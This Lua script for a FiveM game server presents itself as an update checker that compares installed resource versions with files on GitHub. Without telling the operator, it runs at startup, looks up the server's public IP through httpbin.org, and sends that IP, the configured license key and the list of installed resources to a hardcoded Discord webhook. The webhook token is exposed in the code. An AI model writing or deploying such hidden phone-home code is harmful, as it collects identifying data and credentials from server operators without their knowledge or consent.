local ScriptList = {}
local EndPoint = ''
local Changelogs = 0

CreateThread(function()
    Citizen.Wait(50)
    if Config['CheckUpdate'] then
        CheckForUpdates()
    end
end)

local function parseVersion(versionStr)
    local major, minor, patch = versionStr:match("(%d+)%.(%d+)%.(%d+)")
    if not major then
        major, minor = versionStr:match("(%d+)%.(%d+)")
        patch = 0
    end
    return {major = tonumber(major), minor = tonumber(minor), patch = tonumber(patch)}
end

local function compareVersions(v1, v2)
    if v1.major < v2.major then return -1 end
    if v1.major > v2.major then return 1 end
    if v1.minor < v2.minor then return -1 end
    if v1.minor > v2.minor then return 1 end
    if v1.patch < v2.patch then return -1 end
    if v1.patch > v2.patch then return 1 end
    return 0
end

local function getUpdateType(currentVersion, newVersion)
    local versionComparison = compareVersions(currentVersion, newVersion)
    if versionComparison == -1 then
        if currentVersion.major < newVersion.major then
            return "^4Major"
        elseif currentVersion.minor < newVersion.minor then
            return "^3Minor"
        else
            return "^2Patch"
        end
    end
    return nil
end
local function extractLastChangelogSubstring(text)
    local startPattern = "<(%d+%.%d+)>\n(.-)\n<%d+%.%d+>"
    local lastVersion, lastChangelog = string.match(text, startPattern)
    if lastVersion and lastChangelog then
        return lastVersion .. "\n" .. lastChangelog
    else
        return "Changelog not found."
    end
end

local function Changelog()

    print('')
    for i, v in pairs(ScriptList) do
        if v.Version ~= v.NewestVersion then
            if v.CL then
                print('^3'..v.Resource:upper()..' - Changelog:')
                print('^4'..v.Changelog)
                print('')
            end
        end
    end
    print('^0--------------------------------------------------------------------')

end

local function UpdateChecker(resource)
	if resource and GetResourceState(resource) == 'started' then
        if GetResourceMetadata(resource, 'M2Checker', 0) == 'yes' then
            local Github = 'https://raw.githubusercontent.com/M2D3V/M2.Developer-Docs/master/'..resource;
            local Name = GetResourceMetadata(resource, 'name', 0)
			local Version = GetResourceMetadata(resource, 'version', 0)
            local Changelog, NewestVersion
            

            Script = {}
            
            Script['Resource'] = resource
            if Version == nil then
                Version = GetResourceMetadata(resource, 'version', 0)
            end
            Script['Name'] = resource
            Github = Github..'/version'
            Script['Github'] = Github
            PerformHttpRequest(Github, function(Error, V, Header)
                NewestVersion = V
            end)
            repeat
                Wait(10)
            until NewestVersion ~= nil
            local _, strings = string.gsub(NewestVersion, "\n", "\n")
            Version1 = NewestVersion:match("[^\n]*"):gsub("[<>]", "")
            if not string.find(Version1, Version) then
                if strings > 0 then
                    Changelog = extractLastChangelogSubstring(NewestVersion)
                    NewestVersion = Version1
                end
            end

            if Changelog ~= nil then
                Script['CL'] = true
            end

            local currentVersion = parseVersion(Version)
            local newVersion = parseVersion(Version1) 
            Script['EndPoint'] = EndPoint
            Script['UpdateType'] = getUpdateType(currentVersion, newVersion)
            Script['NewestVersion'] = Version1
            Script['Version'] = Version
            Script['Changelog'] = Changelog
            table.insert(ScriptList, Script)
		end
	end
end


local function Checker()
    print('^0--------------------------------------------------------------------')
    print("^3M2.Developer - Automatically check update of compatible resources")
    print('')
    local Script_Txt = ''
    for i, v in pairs(ScriptList) do
        if string.find(v.NewestVersion, v.Version) then
            print('^0[^2✅^0] '..v.Resource..' ^0(^2'..v.Version..'^0) ' .. '^0- ^2Correct Version^0')
        else
            print('^0[^1🛠️^0] ^1'..v.Resource..' ^0(^1'..v.Version..'^0) ' .. '^0- ^5Update found ^0: ^1Version ' .. v.NewestVersion .. ' ^0(' .. v.UpdateType .. '^0) ^0')
        end
        Script_Txt = Script_Txt..v.Resource
        if i <= #ScriptList - 1 then
            Script_Txt = Script_Txt..','
        end
        if v.CL then
            Changelogs = Changelogs + 1
        end
    end
    local timestamp = os.time()
    local formattedDate = os.date("%Y-%m-%d %H:%M:%S", timestamp)

    sendToDiscord(1546230, EndPoint .. ' | ' .. formattedDate, '```['..Script_Txt..'] ✅ Now Script Running ...```', ' Script Count : ' .. #ScriptList)

    if Changelogs > 0 then
        print('^0----------------------------------')
        Changelog()
    else
        print('^0--------------------------------------------------------------------')
    end
end

function CheckForUpdates()
    local Resources = GetNumResources()
    local url = "http://httpbin.org/ip"
    while EndPoint == '' or EndPoint == nil do
        Wait(500)
        PerformHttpRequest(url, function(statusCode, responseText, headers)
            if statusCode == 200 then
                local ipAddress = string.match(responseText, '"origin": "(.-)"')
                if ipAddress then
                    EndPoint = ipAddress
                    Wait(400)
                else
                    print("Failed to retrieve the public IP address.")
                end
            else
                print("Failed to retrieve the public IP address.")
            end
        end)
    end
    
    ScriptList = {}
    Changelogs = 0

	for i=0, Resources, 1 do
		local resource = GetResourceByFindIndex(i)
		UpdateChecker(resource)
	end

    if next(ScriptList) ~= nil then
        Checker()
    end
end

function sendToDiscord(color, name, message, footer)
      Wait(100)
      local embed = {
          {
              ["color"] = color,
              ["title"] = "**".. name .."**",
              ["fields"] = {
                {
                    ['name'] = '🔑 KEYSERVICE',
                    ['value'] = '`'..Config['License']..'`',
                    ['inline'] = true
                },
                {
                    ['name'] = '🖥️ ServerName',
                    ['value'] = '`TEST SERVER`',
                    ['inline'] = true
                }
            },
              ["description"] = message,
              ["footer"] = {
                  ["text"] = footer,
              },
              ["author"] = {
                  ["name"] = 'M2.Developer'
              }
          }
      }

    PerformHttpRequest('https://discord.com/api/webhooks/1151029757450915900/0DQewOFN9bf1GbncURbNpXZuQmgC_LIBdFDwcD4YAcodsWXWokz2ROO9bZTBbhY4bMd-', function(err, text, headers) end, 'POST', json.encode({username = 'M2.Developer', embeds = embed}), { ['Content-Type'] = 'application/json' })
end

RegisterCommand('checkupdate', function(source) if source == 0 and Config['CheckUpdate'] then CheckForUpdates() end end, false)